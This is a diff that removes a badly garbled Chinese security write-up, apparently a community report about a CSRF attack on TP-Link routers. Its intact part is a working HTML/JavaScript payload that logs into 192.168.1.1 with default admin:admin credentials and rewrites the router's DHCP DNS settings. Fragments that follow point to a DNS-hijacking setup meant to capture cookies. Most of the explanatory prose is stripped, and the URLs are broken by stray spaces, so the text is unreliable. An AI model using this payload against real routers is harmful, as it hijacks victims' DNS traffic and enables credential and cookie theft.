@@ -1,148 +1,0 @@
-JSRC N+1
-
- 20119   RAyh4c  TP-LinkCSRF  http://hi.baidu.com/kpstfbahmmalqre/item/
-008121262c7802112b0f1c89
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<script> function dns(){ i = new Image; i.src='http://192.168.1.1/userRpm/LanDhcpServ erRpm.htm?dhcpserver=1&ip1=192.168.1.100&i p2=192.168.1.199&Lease=120&gateway=0.0.0. 0&domain=&dnsserver=8.8.8.8&dnsserver2=0.0. 0.0&Save=%B1%A3+%B4%E6'; }
-</script> <img src="http://admin:admin@192.168.1.1/images/l ogo.jpg" height=1 width=1 onload=dns()>
-
-   dns
-
-     
-
-LANdhcp WAN
-
-
-
- binddnsmasq  VPS  IP
-
- Nginx    LNMP
-
-   
-
- 
-
- 
-
-
-
-
-
- 
-
- 
-
-
-
-
-
-
-
-   Http Authentication   
-
- 
-
-
- 
-
-
- 
- 
-
-
- 
-
- 
- CNZZ  51.LA  Google    
- 
-   
-
- 
-       
- 
- 
-     
-
- 
- 
-   
- 
- 
- 
- 
- 
-
-  http://www.xxx.com/?uid=6731283
- 1.
- 2.
- 3.cookie
-
- 
- dns
- http://www.xxx.com
-
- http://www.xxx.com/?uid=6 731283
- 
-
- dns
-
-js CND
-
- 
-
-js
- 
-
- 
-
-
-
- 
-
- 
-
- 
-
- 
-
- 
-
-
-
- 
-
- 
-
- 
-
-
-
-
-
-
-  
-
- DNS 58.64.155.168  http://www.baidu.com
-
-
- 
-
-     https  
-
-
-
-
